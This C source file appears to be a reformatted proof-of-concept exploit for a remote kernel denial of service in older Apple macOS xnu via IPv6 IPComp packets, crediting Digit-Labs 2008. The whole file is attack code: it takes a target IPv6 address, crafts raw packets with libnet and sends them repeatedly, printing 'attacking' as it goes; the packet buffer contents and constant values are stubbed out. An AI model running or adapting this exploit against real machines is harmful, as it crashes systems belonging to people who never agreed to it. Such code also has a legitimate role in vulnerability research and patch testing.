
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int libnet_t ;


 int AF_INET6 ;
 int EXIT_FAILURE ;
 int EXIT_SUCCESS ;
 unsigned int HAMMER_NUM ;
 size_t IPV6_DST_OFFSET ;
 int IPV6_INTERFACE ;
 size_t IPV6_SRC_OFFSET ;
 int LIBNET_ERRBUF_SIZE ;
 int LIBNET_RAW6_ADV ;
 int exit (int ) ;
 int fprintf (int ,char*,...) ;
 scalar_t__ get_localip (int ,unsigned int*) ;
 int inet_ntop (int ,int *,char*,int) ;
 scalar_t__ inet_pton (int ,char*,unsigned int*) ;
 int * libnet_init (int ,int *,char*) ;
 int libnet_write_raw_ipv6 (int *,int *,int) ;
 int memcpy (int *,unsigned int*,int) ;
 int * pbuf ;
 int printf (char*,...) ;
 int stderr ;

int
main (int argc, char **argv)
{
  char errbuf[LIBNET_ERRBUF_SIZE], ip6_buf[128];
  unsigned int i, ip6_addr[4];
  libnet_t *lnsock;

  printf ("Apple MACOS X xnu <= 1228.3.13 ipv6-ipcomp remote kernel DoS PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  if (argc < 2)
    {
      fprintf (stderr, "Usage: %s <dst ipv6>\n", argv[0]);
      exit (EXIT_FAILURE);
    }

  if (get_localip (IPV6_INTERFACE,
                   (unsigned int *) &pbuf[IPV6_SRC_OFFSET]) < 0)
    {
      fprintf (stderr, "* get_localip() failed\n");
      exit (EXIT_FAILURE);
    }

  if (inet_pton (AF_INET6, argv[1], ip6_addr) <= 0)
    {
      fprintf (stderr, "* inet_pton() failed\n");
      exit (EXIT_FAILURE);
    }
  memcpy (&pbuf[IPV6_DST_OFFSET], ip6_addr, sizeof ip6_addr);

  lnsock = libnet_init (LIBNET_RAW6_ADV, ((void*)0), errbuf);
  if (lnsock == ((void*)0))
    {
      fprintf (stderr, "* libnet_init() failed: %s\n", errbuf);
      exit (EXIT_FAILURE);
    }

  inet_ntop (AF_INET6, &pbuf[IPV6_SRC_OFFSET], ip6_buf, sizeof ip6_buf);
  printf ("* local ipv6 %s...\n", ip6_buf);
  printf ("* attacking %s...", argv[1]);
  for (i = 0; i < HAMMER_NUM; i++)
    libnet_write_raw_ipv6 (lnsock, pbuf, sizeof pbuf - 1);
  printf ("done\n");

  return (EXIT_SUCCESS);
}
